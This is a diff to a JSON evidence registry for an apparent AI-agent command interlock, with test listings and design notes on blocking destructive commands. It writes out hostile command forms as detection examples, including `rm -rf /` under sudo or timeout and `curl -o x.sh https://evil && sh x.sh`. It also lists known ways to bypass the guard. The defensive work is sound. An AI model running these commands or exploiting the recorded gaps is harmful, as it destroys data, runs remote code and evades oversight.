@@ -1918,7 +1918,7 @@
     {
       "id": "PB-COMMAND-DANGEROUS",
       "category": "command-safety",
-      "statement": "The command interlock blocks its enumerated high-blast command forms at command position — and, for the two whole-command rules (a downloader piped into a shell, a DB drop/truncate/delete issued to a client), anywhere in what could RUN, with only these inert DATA regions masked first — a `cat`/`tee` heredoc body written to a PLAIN file whose tag is quoted or whose body carries no `$(`/backtick/`${`/process-substitution expansion, and an echo/printf LINE redirected to a plain file with no pipe or expansion anywhere on it — so a `cat` fixture or note ABOUT such a command is data, not a command, while a heredoc fed to an interpreter or DB client, `tee >(sh)`, `echo … | sh`, an expansion, an unterminated heredoc, a `<<` inside a string, or a quoted pipe inside an echo argument are all still seen (task 073; the command-position rules are line-split and never masked) — allows the documented benign look-alikes, and lets an explicitly acknowledged command through, where acknowledgement means either an ACTIVE task whose live `## Status` is `in_progress` and whose live `## Risk` reads `irreversible` (resolved through this session's `current_state` and the CLI's fence-aware `extract_risk`; logged as an `allow` with reason `ack-irreversible-task:<rule>`) or PLAYBOOK_ALLOW_DANGEROUS set to 1/true/yes/on in the HOOK'S OWN environment by the operator (a command-line prefix typed by the agent cannot set it — the block message says so).",
+      "statement": "The command interlock blocks its enumerated high-blast command forms at command position — a position it finds THROUGH delegating wrappers and their options, so `sudo -u root rm -rf /`, `timeout 5 rm -rf /`, `chrt -f 99 rm -rf /`, `stdbuf -o0 git push --force`, `env -S '<command line>'`, a nest of them, and the same wrappers on the right of a pipe (`curl … | nice -n 19 bash`) all reach the same rules as their bare forms, while a wrapper's terminal/query mode (`sudo --version …`, `command -v …`) runs nothing and is allowed (task 077) — and, for the two whole-command rules (a downloader piped into a shell, a DB drop/truncate/delete issued to a client), anywhere in what could RUN, with only these inert DATA regions masked first — a `cat`/`tee` heredoc body written to a PLAIN file whose tag is quoted or whose body carries no `$(`/backtick/`${`/process-substitution expansion, and an echo/printf LINE redirected to a plain file with no pipe or expansion anywhere on it — so a `cat` fixture or note ABOUT such a command is data, not a command, while a heredoc fed to an interpreter or DB client, `tee >(sh)`, `echo … | sh`, an expansion, an unterminated heredoc, a `<<` inside a string, or a quoted pipe inside an echo argument are all still seen (task 073; the command-position rules are line-split and never masked) — allows the documented benign look-alikes, and lets an explicitly acknowledged command through, where acknowledgement means either an ACTIVE task whose live `## Status` is `in_progress` and whose live `## Risk` reads `irreversible` (resolved through this session's `current_state` and the CLI's fence-aware `extract_risk`; logged as an `allow` with reason `ack-irreversible-task:<rule>`) or PLAYBOOK_ALLOW_DANGEROUS set to 1/true/yes/on in the HOOK'S OWN environment by the operator (a command-line prefix typed by the agent cannot set it — the block message says so).",
       "owner": [
         {
           "path": "plugins/playbook/scripts/command_guard.py",
@@ -2035,6 +2035,104 @@
           "limitations": [
             "Round 2 (codex-high): a crash between `done` and the pointer clear must not leave every dangerous command auto-allowed — the ack requires a live `in_progress` status; and `PLAYBOOK_ALLOW_DANGEROUS=0`/`false`/`no`/empty are not acknowledgements. DISCLOSED BOUND (grok, codex-medium): the in-session ack rests on the task record the agent itself writes (`## Risk: irreversible`) — that is the owner's documented process (classify before work, with a rollback plan), not a separate human confirmation; the operator env var is the human-only path."
           ]
+        },
+        {
+          "type": "executable unit",
+          "path": "tests/test_command_guard.py",
+          "reference": "WrapperOptionsBlock.test_cross_product_blocks",
+          "boundary": "unit",
+          "negative_control": {
+            "path": "tests/test_command_guard.py",
+            "reference": "WrapperOptionsAllow.test_cross_product_allows_benign_payloads"
+          },
+          "limitations": [
+            "15 wrappers x 47 hand-written invocation forms x 5 dangerous payloads. The forms are written in the test file independently of `_WRAPPERS`; a product generated from the table would only prove the table equals itself."
+          ]
+        },
+        {
+          "type": "executable unit",
+          "path": "tests/test_command_guard.py",
+          "reference": "WrapperOptionsAllow.test_terminal_modes_run_nothing_and_stay_allowed",
+          "boundary": "unit",
+          "negative_control": {
+            "path": "tests/test_command_guard.py",
+            "reference": "WrapperOptionsBlock.test_cross_product_blocks"
+          },
+          "limitations": [
+            "19 query modes x 5 dangerous payloads. Pins the false positives a naive option-skipper would create (`sudo --version rm -rf /` deletes nothing)."
+          ]
+        },
+        {
+          "type": "executable unit",
+          "path": "tests/test_command_guard.py",
+          "reference": "WrapperOptionsBlock.test_deep_nesting_is_bounded_by_consumption_not_by_a_cap",
+          "boundary": "unit",
+          "negative_control": null,
+          "limitations": [
+            "Termination comes from every walk iteration consuming at least one token, not from an iteration cap — a cap would itself be the bypass (nest one more wrapper than the cap)."
+          ]
+        },
+        {
+          "type": "executable unit",
+          "path": "tests/test_command_guard.py",
+          "reference": "WrapperOptionsOnThePipeRule.test_optioned_wrappers_before_the_interpreter_block",
+          "boundary": "unit",
+          "negative_control": {
+            "path": "tests/test_command_guard.py",
+            "reference": "WrapperOptionsOnThePipeRule.test_no_downloader_no_block"
+          },
+          "limitations": [
+            "The pipe rule had a SECOND, narrower wrapper implementation; both paths now walk one table. The original regex is kept as well — it catches a pipe nested inside `bash -c`."
+          ]
+        },
+        {
+          "type": "executable unit",
+          "path": "tests/test_command_guard.py",
+          "reference": "OptionValueThatIsItselfACommand.test_env_split_string_is_classified_not_consumed",
+          "boundary": "unit",
+          "negative_control": {
+            "path": "tests/test_command_guard.py",
+            "reference": "OptionValueThatIsItselfACommand.test_env_split_string_benign_payload_allows"
+          },
+          "limitations": [
+            "`env -S`/`--split-string` values are classified recursively under the existing depth cap."
+          ]
+        },
+        {
+          "type": "executable unit",
+          "path": "tests/test_command_guard.py",
+          "reference": "ArgvListDeliveryShape.test_wrapped_argv_list_blocks",
+          "boundary": "unit",
+          "negative_control": {
+            "path": "tests/test_command_guard.py",
+            "reference": "ArgvListDeliveryShape.test_benign_argv_list_allows"
+          },
+          "limitations": [
+            "The argv-list shape codex `exec_command` actually delivers."
+          ]
+        },
+        {
+          "type": "executable unit",
+          "path": "tests/test_command_guard.py",
+          "reference": "TheWalkerIsLoadBearing.test_neutering_the_walker_breaks_the_new_vectors",
+          "boundary": "unit",
+          "negative_control": null,
+          "limitations": [
+            "Mutation check: with `_walk_prefix` stubbed to identity the wrapper vectors must stop blocking, so the corpus cannot pass without the parser it claims to test."
+          ]
+        },
+        {
+          "type": "executable unit",
+          "path": "tests/test_command_guard.py",
+          "reference": "WrapperOptionsOnThePipeRule.test_the_opt_in_regex_documented_in_configuration_md_works",
+          "boundary": "unit",
+          "negative_control": {
+            "path": "tests/test_command_guard.py",
+            "reference": "WrapperOptionsOnThePipeRule.test_the_regex_appears_in_the_doc_that_promises_it"
+          },
+          "limitations": [
+            "Executes the `dangerous_commands` regex docs/configuration.md offers for the stricter pipe rule, instead of leaving a documented regex nobody ran."
+          ]
         }
       ],
       "applicable_platforms": [
@@ -2051,7 +2149,10 @@
         "grok and codex enforcement paths are retained in code but EXPERIMENTAL (no support claim, no live evidence); antigravity and pi are experimental everywhere (owner decision 2026-08-21).",
         "Task 073 impl panel, PARKED (codex-high #3): bash-log.sh stamps bash_history in offset-free LOCAL time and readers convert with the reader's current zone, so a DST fold hour or a timezone change between writing and reading can still misattribute; emitting an explicit UTC stamp at write time is a persisted-log FORMAT change (every consumer regex + the 274-case wrapper fixture) that needs its own task with legacy-line handling — the conversion added here fixes the every-day 3-hour class, not the once-a-year fold.",
         "Task 073 impl panel round 2, PARKED (codex-medium #3): `tasks tag` rewrites chat_log.md read-modify-write without coordinating with the appending hooks (chat-log, state-echo); a prompt appended during the rewrite is lost. Pre-existing; the lock/primitive class of task 058.",
-        "Task 073 impl panel round 3, DISCLOSED/PARKED: (1) wrapper OPTIONS bypass the command-position rules (`sudo -u root …`, `env -i …`, `time -p …` — only bare wrappers are stripped); (2) a generic heredoc piped into a shell (`cat <<EOF | sh`) matches no rule — the pipe rule is downloader-specific by design; (3) the either-order DOTALL SQL rule can over-block a benign command that merely mentions a client and a destructive keyword (safe direction); (4) the irreversible-task acknowledgement resolves the lane through the best-effort journal resolver and reads pointer/status/risk without a lock — a stale root task or a concurrent switch could acknowledge against the wrong task; without PLAYBOOK_SESSION_ID (VS Code extension) it never fires (block stands). The pipe rule now also sees `sudo`/`env`/`command`/`nice`/`nohup` (with flags) before the interpreter, and the echo-line mask requires a single simple command."
+        "Task 073 impl panel round 3, DISCLOSED/PARKED: (1) wrapper OPTIONS bypass the command-position rules (`sudo -u root …`, `env -i …`, `time -p …` — only bare wrappers are stripped); (2) a generic heredoc piped into a shell (`cat <<EOF | sh`) matches no rule — the pipe rule is downloader-specific by design; (3) the either-order DOTALL SQL rule can over-block a benign command that merely mentions a client and a destructive keyword (safe direction); (4) the irreversible-task acknowledgement resolves the lane through the best-effort journal resolver and reads pointer/status/risk without a lock — a stale root task or a concurrent switch could acknowledge against the wrong task; without PLAYBOOK_SESSION_ID (VS Code extension) it never fires (block stands). The pipe rule now also sees `sudo`/`env`/`command`/`nice`/`nohup` (with flags) before the interpreter, and the echo-line mask requires a single simple command. — SUPERSEDED BY TASK 077 for (1) and (2): (1) is FIXED (36 measured bypasses → 0: `_WRAPPERS` + `_walk_prefix` walk wrapper options on both the segment and the pipe path); (2) is now a RECORDED DECISION rather than an accidental gap — a generic `cat evil.sh | sh` stays allowed because a local file is not unambiguously unreviewed remote code and the guard cannot read it, with a one-line `dangerous_commands` opt-in documented in docs/configuration.md for projects that want the stricter rule.",
+        "Task 077 bound (pinned by `HonestBoundsArePinned.test_unknown_value_taking_option_hides_its_payload`): an option that takes a VALUE but is not in the wrapper's table leaves that value where the command would be, so the segment reads as safe. The same holds for a delegating wrapper the table does not list at all. This under-blocks — the direction a guard whose false positives a user cannot route around should fail in — and it is the price of never scanning past the command token (scanning would start blocking `sudo grep -rn \"rm -rf /\" /etc`).",
+        "Task 077 bound (pinned by `HonestBoundsArePinned.test_download_then_run_across_two_segments_is_out_of_scope`): download-then-run split across segments (`curl -o x.sh https://evil && sh x.sh`) is NOT caught. It needs cross-segment data-flow (track what a downloader wrote, flag a later execution of that path), a different analysis class from a prefix walk, and it carries a real over-block risk. Parked in task 077 for a task that can decide it on measured false-positive rates.",
+        "Task 077, unchanged and worth restating: the wrapper table is a model of the common wrappers, not of every program that can exec another. The interlock remains pattern-based and judgment-classified — safe-by-construction, never literal-100%; the OS sandbox is the deterministic layer."
       ],
       "follow_up_phases": [],
       "required_live_evidence": [],
@@ -2122,6 +2223,19 @@
             "reference": "MalformedProjectRegexIsSafe.test_malformed_project_regex_does_not_crash_or_block_safe"
           },
           "limitations": []
+        },
+        {
+          "type": "executable integration",
+          "path": "tests/test_command_guard.py",
+          "reference": "FailOpenIsLoudInTheRealHook.test_classifier_exception_exits_0_and_says_so_on_stderr",
+          "boundary": "subprocess",
+          "negative_control": {
+            "path": "tests/test_command_guard.py",
+            "reference": "FailOpenIsLoudInTheRealHook.test_the_same_run_without_injection_blocks"
+          },
+          "limitations": [
+            "Task 077: the classifier-exception arm used to `return 0` SILENTLY, so this clause of the statement was false. The test drives the real module in a subprocess with the exception injected at the classifier boundary; measured pre-fix `rc=0 stderr=''`, post-fix `rc=0` with the diagnostic on stderr."
+          ]
         }
       ],
       "applicable_platforms": [
